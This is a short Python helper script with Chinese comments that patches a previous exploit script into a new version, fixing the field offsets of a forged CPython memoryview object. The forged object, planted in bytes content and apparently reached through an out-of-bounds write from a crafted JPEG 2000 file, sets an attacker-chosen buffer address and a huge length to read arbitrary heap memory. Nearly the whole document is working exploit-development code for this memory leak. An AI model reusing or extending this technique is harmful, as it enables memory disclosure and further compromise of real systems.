#!/usr/bin/env python3
# 由 leak_v9.py 生成 leak_v10.py：修正 PyMemoryViewObject 的字段偏移
#   PyObject_VAR_HEAD: 0x00 refcnt | 0x08 type | 0x10 ob_size
#                      0x18 mbuf   | 0x20 len  | 0x28 view.buf ★ | 0x30 view.obj | 0x38 view.len
#                      0x40 itemsize | 0x48 readonly | 0x4c ndim | 0x50 format | 0x58 shape
#   越界写的落点只有 obj+0x00/0x08/0x18/0x20/0x30/0x38 ⇒ view.buf(+0x28) 必须在内容里预置
import ast, sys

s = open('/tmp/leak_v9.py').read()
s = s.replace('/tmp/leak_result9.txt', '/tmp/leak_result10.txt')
s = s.replace('/tmp/LEAK9.j2k', '/tmp/LEAK10.j2k')

old = """raw = bytearray(519)
struct.pack_into('<Q', raw, 0x20, PY_BYTES)      # obj+0x40 view.obj
struct.pack_into('<Q', raw, 0x28, 0x40)          # obj+0x48 view.len（会被耦合覆盖）
struct.pack_into('<Q', raw, 0x30, 1)             # obj+0x50 itemsize
struct.pack_into('<Q', raw, 0x38, 0x100000000)   # obj+0x58 ndim"""

new = """# data 基址 = 对象+0x20（PyBytesObject 头 0x20 字节）
raw = bytearray(519)
struct.pack_into('<Q', raw, 0x00, 0x40)          # obj+0x20 mv.len
struct.pack_into('<Q', raw, 0x08, READ_ADDR)     # obj+0x28 view.buf  ★★ 核心
struct.pack_into('<Q', raw, 0x10, PY_BYTES)      # obj+0x30 view.obj（合法非空对象指针）
struct.pack_into('<Q', raw, 0x18, 0x100000000)   # obj+0x38 view.len（大 ⇒ 可跨堆读）
struct.pack_into('<Q', raw, 0x20, 1)             # obj+0x40 itemsize=1
struct.pack_into('<Q', raw, 0x28, 1 << 32)       # obj+0x48 readonly=0, ndim=1
struct.pack_into('<Q', raw, 0x30, 0)             # obj+0x50 format=NULL ⇒ bytes-like
struct.pack_into('<Q', raw, 0x38, 0)             # obj+0x58 shape=NULL"""

if old not in s:
    print('!! 预置块锚点没找到'); sys.exit(1)
s = s.replace(old, new)
open('/tmp/leak_v10.py', 'w').write(s)
ast.parse(s)
print('ok: /tmp/leak_v10.py 生成且语法通过')